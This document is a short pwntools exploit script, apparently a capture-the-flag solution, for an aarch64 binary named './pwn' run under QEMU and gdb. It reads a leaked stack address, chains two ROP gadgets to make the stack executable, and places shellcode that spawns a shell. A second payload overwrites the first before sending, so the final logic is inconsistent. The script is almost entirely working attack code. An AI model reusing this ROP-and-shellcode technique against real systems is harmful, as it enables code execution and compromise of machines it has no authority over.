from pwn import *
import os
os.environ['QEMU_LD_PREFIX'] = '/usr/aarch64-linux-gnu'
context(terminal = ['tmux','splitw','-h'], arch = "aarch64", log_level = "debug")

io = gdb.debug('./pwn','''
b *main
c
''')

io.recvuntil(b'at: ')
stack = int(io.recv(0xe), 16)
print(hex(stack))

# 0x43e980 : ldp x19, x20, [sp, #0x10] ; ldp x21, x22, [sp, #0x20] ; ldp x23, x24, [sp, #0x30] ; ldp x25, x26, [sp, #0x40] ; ldp x27, x28, [sp, #0x50] ; ldp x29, x30, [sp], #0x130 ; ret
# x19-x30

# 0x42f278 : ldr x3, [x21, #0x38] ; mov x1, x23 ; mov x2, x20 ; mov x0, x19 ; blr x3

shellcode = asm(shellcraft.aarch64.sh())

payload = b''
payload += b'/flag\x00' + p64(0x43E568) # x3
payload += b'\x00'*0x29 + p64(0x0) # x29
payload += p64(0x43e980) # x30
payload += p64(0x0) + p64(0x42f278) # x29, x30
payload += p64((int(stack/0x1000)*0x1000)) + p64(0x7) # x19(x0), x20(x2)
payload += p64(stack + 6 - 0x38) + p64(0x0) # x21, x22
payload += p64(0x1000) + p64(0x0) # x23(x1), x24
payload += p64(0x0) + p64(0x0) # x25, x26
payload += p64(0x0) + p64(0x0) # x27, x28
payload += shellcode + b'\x00'*(0xD0-len(shellcode))
payload += p64(0x0) + p64(stack + 0xa7)

payload = b''
payload += b'/flag\x00' + p64(0x0) # x3
payload += b'\x00'*0x29 + p64(0x0) # x29
payload += p64(0x401878) # x30
io.send(payload)

io.interactive()
